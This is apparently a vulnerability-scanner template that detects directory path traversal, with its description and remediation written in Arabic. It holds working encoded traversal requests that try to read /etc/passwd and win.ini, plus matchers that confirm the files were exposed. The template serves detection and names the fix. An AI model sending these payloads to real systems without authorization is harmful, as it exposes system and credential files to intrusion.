id: path-traversal-detection
info:
  name: Directory Path Traversal Vulnerability
  author: YemenScan-Core
  severity: high
  description: إمكانية تجاوز مجلد العمل والوصول إلى ملفات خارج مسار الويب العام عبر
    محارف التراجع (../ أو ..\).
  remediation: تجريد محارف التراجع والتحقق من أن المسار النهائي يقع حصراً داخل المجلد
    الجذر المخصص للوثائق.
  tags:
  - traversal
  - lfi
  - filesystem
http:
- method: GET
  path:
  - '{{BaseURL}}/static/..%2f..%2f..%2fetc/passwd'
  - '{{BaseURL}}/assets/..%5c..%5c..%5cwindows/win.ini'
  matchers-condition: or
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: word
    words:
    - '[fonts]'
    - '[extensions]'
